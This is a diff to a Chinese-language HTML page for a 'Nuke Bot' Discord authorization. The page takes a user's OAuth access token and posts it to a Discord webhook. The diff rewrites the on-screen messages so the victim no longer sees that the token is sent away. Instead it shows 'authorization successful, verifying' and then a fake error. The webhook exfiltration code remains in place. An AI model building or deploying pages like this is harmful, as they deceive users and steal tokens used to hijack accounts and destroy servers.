@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Nuke Bot 授权</title>
+  <title>WWW HUB NUKE BOT</title>
   <style>
     body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #1a1a2e; color: white; }
     button { background: #5865F2; border: none; color: white; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; }
@@ -11,9 +11,9 @@
   </style>
 </head>
 <body>
-  <h1>💣 Nuke Bot 授权</h1>
-  <p>点击下方按钮授权，Token将自动发送到安全频道</p>
-  <button onclick="startAuth()">📩 授权</button>
+  <h1>Nuke Bot 授权</h1>
+  <p>点击下方按钮授权</p>
+  <button onclick="startAuth()">授权按鈕</button>
   <p id="status">等待授权...</p>
 
   <script>
@@ -48,7 +48,7 @@
         .then(data => {
           if (data.access_token) {
             const token = data.access_token;
-            document.getElementById('status').innerText = '✅ Token已获取，发送中...';
+            document.getElementById('status').innerText = '✅成功授權正在驗證';
 
             // ---- 通过Webhook发送Token到Discord频道 ----
             return fetch(webhookUrl, {
@@ -59,7 +59,7 @@
               })
             })
             .then(() => {
-              document.getElementById('status').innerText = '✅ Token已发送到Discord频道！';
+              document.getElementById('status').innerText = '❌ 错误！';
               alert('Token已通过Webhook发送到你的频道，去查看吧。');
             });
 
